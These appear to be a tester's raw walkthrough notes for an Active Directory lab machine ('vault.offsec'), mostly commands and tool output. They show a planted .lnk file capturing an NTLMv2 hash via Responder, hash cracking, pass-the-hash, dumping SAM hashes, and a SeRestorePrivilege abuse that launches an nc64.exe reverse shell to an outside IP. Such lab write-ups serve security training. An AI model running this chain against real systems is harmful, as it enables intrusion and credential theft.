PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-18 06:47:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-18T06:49:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-08-17T06:42:26
|_Not valid after:  2027-02-16T06:42:26
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-18T06:48:24+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49805/tcp open  msrpc         Microsoft Windows RPC


└─$ netexec smb 192.168.247.172 -u guest -p '' --shares    
SMB         192.168.247.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:None)
SMB         192.168.247.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.247.172 445    DC               [*] Enumerated shares
SMB         192.168.247.172 445    DC               Share           Permissions     Remark
SMB         192.168.247.172 445    DC               -----           -----------     ------
SMB         192.168.247.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.247.172 445    DC               C$                              Default share
SMB         192.168.247.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.247.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.247.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.247.172 445    DC               SYSVOL                          Logon server share 

https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land



When a Windows machine attempts to load resources (like icons, external templates, or remote images) specified via a network path (UNCP/SMB path like \\attacker-ip\share\image.png), Windows automatically sends the user’s NetNTLMv2 authentication token to that server.

https://github.com/Greenwolf/ntlm_theft

└─$ python3 ntlm_theft.py -g lnk --server 192.168.45.214 -f my           
Created: my/my.lnk (BROWSE TO FOLDER)
Generation Complete.

└─$ smbclient //192.168.247.172/DocumentsShare --user=guest --password=''
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 18 15:29:25 2026
  ..                                  D        0  Tue Aug 18 15:29:25 2026
p
		7706623 blocks of size 4096. 1071262 blocks available
smb: \> put my.lnk 


└─$ sudo responder -I tun0 -wv
[sudo] password for ed: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
<snip>
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.214]
    Responder IPv6             [fe80::8cad:2c64:fee2:76b0]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-I83Z6AZ0981]
    Responder Domain Name      [YZRU.LOCAL]
    Responder DCE-RPC Port     [47806]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.247.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:b43f216403ab6e9f:92F7BE6FBFF68AFA0AA9CF0CD1273C9A:010100000000000000B452C4262FDD0132F7A791D8CA0500000000000200080059005A005200550001001E00570049004E002D004900380033005A00360041005A00300039003800310004003400570049004E002D004900380033005A00360041005A0030003900380031002E0059005A00520055002E004C004F00430041004C000300140059005A00520055002E004C004F00430041004C000500140059005A00520055002E004C004F00430041004C000700080000B452C4262FDD01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310034000000000000000000
[SMB] NTLMv2-SSP Client   : 192.168.247.172



https://github.com/Plazmaz/LNKUp




└─$ hashcat -m 5600 -a 0 hash ~/tools/rockyou.txt 

ANIRUDH::VAULT:b43f216403ab6e9f:92f7be6fbff68afa0aa9cf0cd1273c9a:010100000000000000b452c4262fdd0132f7a791d8ca0500000000000200080059005a005200550001001e00570049004e002d004900380033005a00360041005a00300039003800310004003400570049004e002d004900380033005a00360041005a0030003900380031002e0059005a00520055002e004c004f00430041004c000300140059005a00520055002e004c004f00430041004c000500140059005a00520055002e004c004f00430041004c000700080000b452c4262fdd01060004000200000008003000300000000000000001000000002000001830f0c706803f0173332094f5b2bb5fb0c4dad79922348512363cc7dc51c8100a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310034000000000000000000:SecureHM


ANIRUDH
SecureHM

└─$ evil-winrm -i 192.168.247.172 -u ANIRUDH -p SecureHM          

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami
vault\anirudh

*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
vault\anirudh S-1-5-21-537427935-490066102-1511301751-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


└─$ bloodyad --host 192.168.247.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Server Operators" --attr msds-memberTransitive

distinguishedName: CN=Server Operators,CN=Builtin,DC=vault,DC=offsec
msds-memberTransitive: CN=Anirudh,CN=Users,DC=vault,DC=offsec

net rpc group members "Server Operators" -U vault.offsec/ANIRUDH%SecureHM -S 192.168.247.172
VAULT\anirudh

 ldeep ldap -u ANIRUDH -p 'SecureHM' -d vault.offsec -s ldap://192.168.247.172 membersof "Server Operators" 
anirudh (user)


Because utilman.exe can be triggered from the Windows login screen before a user logs in, it runs with high-level system privileges (NT AUTHORITY\SYSTEM).  Historically, attackers or system administrators with physical access to an unencrypted PC could boot into a recovery environment and swap utilman.exe with cmd.exe

but we cannot rdp to this host.

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 

pass the hash to winrm

└─$ evil-winrm -i 192.168.204.172 -u administrator -H '608339ddc8f434ac21945e026887dc36'
                                                                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> whoami
                                    
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1


*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Management Users'
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
anirudh
The command completed successfully.

*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup 'Remote Desktop Users'
Alias name     Remote Desktop Users
Comment        Members in this group are granted the right to logon remotely

Members

-------------------------------------------------------------------------------
The command completed successfully.

└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Management Users" --attr msds-memberTransitive

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=vault,DC=offsec
msds-memberTransitive: CN=Anirudh,CN=Users,DC=vault,DC=offsec
                                                                                                    
┌──(ed㉿kali)-[~]
└─$ bloodyad --host 192.168.204.172 --dns 192.168.247.172 -d vault.offsec -u ANIRUDH -p 'SecureHM' get object "Remote Desktop Users" --attr msds-memberTransitive

distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=vault,DC=offsec

*Evil-WinRM* PS C:\Users\anirudh\Documents> upload Invoke-SeRestoreAbuse.ps1

*Evil-WinRM* PS C:\Users\anirudh\Documents> upload nc64.exe

*Evil-WinRM* PS C:\Users\anirudh\Documents> . .\Invoke-SeRestoreAbuse.ps1

C:\Users\anirudh\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"'
[+] SeRestorePrivilege privilege enabled
[+] ImagePath set to: cmd /c powershell -c "C:\Users\anirudh\Documents\nc64.exe 192.168.45.152 8821 -e powershell"


*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpHound.exe

*Evil-WinRM* PS C:\Users\anirudh\Documents> .\SharpHound.exe

*Evil-WinRM* PS C:\Users\anirudh\Documents> download 20260818083518_BloodHound.zip


└─$ bloodhound-python -u anirudh -p 'SecureHM' -ns 192.168.204.172 -d vault.offsec -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vault.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.vault.offsec
INFO: Done in 00M 20S
INFO: Compressing output into 20260818114230_bloodhound.zip


ANIRUDH@VAULT.OFFSEC ----General Write ----> DEfault domian policy

https://www.thehacker.recipes/ad/movement/group-policies

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master

